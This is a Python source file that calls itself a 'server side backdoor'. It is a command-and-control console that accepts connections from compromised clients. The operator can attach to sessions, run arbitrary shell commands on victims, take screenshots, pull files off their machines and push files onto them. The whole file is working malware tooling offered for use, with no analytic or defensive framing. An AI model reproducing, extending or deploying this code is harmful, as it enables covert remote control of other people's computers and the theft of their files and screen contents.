# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, gaierror
from threading import Thread
from getpass import getuser
from pickle import loads, dumps
from datetime import datetime
from pathlib import Path
from time import sleep
from rich.progress import BarColumn, Progress, TimeRemainingColumn
from rich import print as printr
from os import system, uname

class Server(object):
    """ server side backdoor """
    def __init__(self, host='0.0.0.0', port=5000):
        self.__Address = (host, port)
        self.connectedUsers = {}
        self.userAttached = self.userCwd = ''
        self.especialComamnds = {'clear': self.clearScreen, 'cls': self.clearScreen, 'exit': self.closeTerminal}

    def __repr__(self):
        print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')

    def attach(self, name):
        if name:
            if self.connectedUsers.get(name):
                self.userAttached = name
                self.userCwd = self.connectedUsers.get(self.userAttached)['currentDirectory']
                printr(f'[green] You are attached to a section with {name} now!')
            else:
                printr(f'[red] There is no open session with [yellow]{name}.')
        else:
            printr('Info: Attaches to an active session. [green]Ex: /attach zNairy-PC')

    def detach(self, name):
        if self.userAttached:
            self.userAttached = self.userCwd = ''
        else:
            printr(f'[red] No session currently attached.')

    def checkFolders(self):
        for folder in ['./screenshots','files']:
            if not Path(folder).is_dir():
                Path(folder).mkdir()

    def sendHeader(self, connection, header):
        connection.send(dumps(header))

    def splitFile(self, path):
        with open(path, 'rb') as file:
            return Path(path).stem, Path(path).suffix, file.read()

    def saveReceivedFile(self, path, content):
        with open(path, 'wb') as receivedFile:
            receivedFile.write(content)

    def receiveFile(self, connection, header):
        progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())

        with progress:
            task = progress.add_task(f"Downloading {header['namefile']}", total=header['bytes'])

            file = received = b''

            while len(file) < header['bytes']:
                received = connection.recv(header['bytes'])
                file += received
                progress.update(task, advance=len(received))

        self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', file)
    
    def upload(self, args):
        if self.userAttached:
            if args:
                try:
                    if Path(args).is_file():
                        connection = self.connectedUsers[self.userAttached]['conn']
                        connection.send(self.lastCommand.encode())
                        
                        namefile, extension, file = self.splitFile(args)
                        self.sendHeader(connection, {"namefile": namefile, "extension": extension, "bytes": len(file)})    
                        sleep(1)
                        connection.send(file)

                        response = loads(connection.recv(512))
                        if response['sucess']:
                            printr(f"[green]{response['content']}")
                        else:
                            printr(f"[red]{response['content']}")
                    else:
                        printr(f'[red] File {args} not found.')

                except PermissionError:
                    printr(f'[red] Permission denied: {args}')
            else:
                printr('Info: Upload a file to client. [green]Ex: /upload nothing.pdf')
        else:
            printr('[yellow] No session currently attached.')

    def download(self, args):
        self.checkFolders()

        if self.userAttached:
            if args:
                connection = self.connectedUsers[self.userAttached]['conn']
                connection.send(self.lastCommand.encode())
                header = loads(connection.recv(512))
                if header["sucess"]:
                    self.receiveFile(connection, header)
                else:
                    printr(f'[red]{header["content"]}')
            else:
                printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')
        else:
            printr('[yellow] No session currently attached.')

    def screenshot(self, args):
        self.checkFolders()

        if self.userAttached:
            connection = self.connectedUsers[self.userAttached]['conn']
            connection.send('/screenshot'.encode())
            header = loads(connection.recv(512))
            self.receiveFile(connection, header)
        else:
            printr('[yellow] No session currently attached.')

    def elapsedTime(self, ti, tf):
        return f'{int(tf[0])-int(ti[0])}.{int(tf[1])-int(ti[1])}'

    def addUser(self, data):
        self.connectedUsers.update({data['name']: data})

    def removeUser(self, name):
        if name:
            if self.connectedUsers.get(name):
                if self.userAttached:
                    self.detach(self.userAttached)
                self.connectedUsers.pop(name)
                printr(f'[green] Session with [yellow]{name} [green]removed!')
            else:
                printr(f'[red] There is no open session with [yellow]{name}.')
        else:
            print('Info: Removes an active section. [green]Ex: /rmsession zNairy-PC')

    def clearScreen(self, args=''):
        system('clear' if uname().sysname.lower() == 'linux' else 'cls')

    def showSessions(self, args):
        if self.connectedUsers:
            print(''.join(f'  -{name}\n' for name in self.connectedUsers.keys()))
        else:
            printr('[yellow] There is no open sessions currently.')

    def showVersion(self, args):
        printr(__version__)

    def showContact(self, args):
        printr(__contact__)

    def showCodeAuthor(self, args):
        printr(__author__)

    def closeTerminal(self, args=''):
        exit()

    def availableCommands(self, args):
        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() ))

    def showLastCommand(self, args):
        printr(self.lastCommand)

    def internalcommands(self, args):
        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))

    def allCommands(self):
        commands = {
            "/attach": {"local": True, "action": self.attach},
            "/detach": {"local": True, "action": self.detach},
            "/sessions": {"local": True, "action": self.showSessions},
            "/rmsession": {"local": True, "action": self.removeUser},
            "/screenshot": {"local": False, "action": self.screenshot},
            "/download": {"local": False, "action": self.download},
            "/upload": {"local": False, "action": self.upload},
            "/author": {"local": True, "action": self.showCodeAuthor},
            "/contact": {"local": True, "action": self.showContact},
            "/version": {"local": True, "action": self.showVersion},
            "/internalcommands": {"local": True, "action": self.internalcommands},
        }

        commands.update({"/commands": {"local": True, "action": self.availableCommands}})

        return commands

    def splitCommand(self, command):
        if self.allCommands().get(command.split()[0]):
            return self.allCommands()[command.split()[0]], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #

        return False, ''.join(f'{cmd} ' for cmd in command.split()[1:])

    def checkCommand(self, command):
        self.lastCommand = command

        command, args = self.splitCommand(command)
        if command:
            command['action'](args.strip())
        else:
            printr('[red] Command does not exist.')

    def receiveCommand(self, connection, header):
        received = b''
        while len(received) < header['bytes']:
            received += connection.recv(header['bytes'])

        print(received.decode())
        printr(f'returned in {self.elapsedTime(header["time"], datetime.now().strftime("%M %S").split())} seconds.')

    def sendCommand(self, command):
        self.lastCommand = command

        if self.userAttached:
            connection = self.connectedUsers[self.userAttached]['conn']
            connection.send(command.encode())
            header = loads(connection.recv(512))
            self.userCwd = header['currentDirectory']
            self.receiveCommand(connection, header)
        else:
            printr('[yellow] No session currently attached.')

    def startTerminal(self):
        try:
            while True:
                printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]:{self.userCwd}# ', end='')
                command = input().strip()
                if command:
                    if command.split()[0] not in ['clear', 'cls', 'exit']:
                        if command.startswith('/'):
                            self.checkCommand(command)
                        else:
                            self.sendCommand(command)
                    else:
                        self.especialComamnds[command.split()[0]]()

        except KeyboardInterrupt:
            print()
            exit()

    def startProcess(self, function, arg=()):
        thread = Thread(target=function)
        thread.daemon = True
        thread.start()

    def listenConnections(self):
        while True:
            connection, address = self.__Server.accept();del(address)
            response = loads(connection.recv(1024))
            response.update({"conn": connection})
            self.addUser(response)
            printr(f'\n[*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
            printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]#:{self.userCwd}# ', end='')

    def configureSocket(self):
        try:
            self.__Server = socket(AF_INET, SOCK_STREAM)
            self.__Server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.__Server.bind(self.__Address)
            self.__Server.listen(1)

        except OverflowError:
            printr(f' "{self.__Address[1]}" [red]Port too large, must be 0-65535');exit(1)
        except OSError:
            printr(f' "{self.__Address[0]}" Cannot assign requested address');exit(1)
        except gaierror:
            printr(f' "{self.__Address[0]}" [red]Name or service not known');exit(1)

    def info(self):
        return f' Server is open in {self.__Address[0]}:{self.__Address[1]}'

    def run(self):
        self.configureSocket()
        
        printr(self.info())
        self.startProcess(self.listenConnections)
        self.startTerminal()
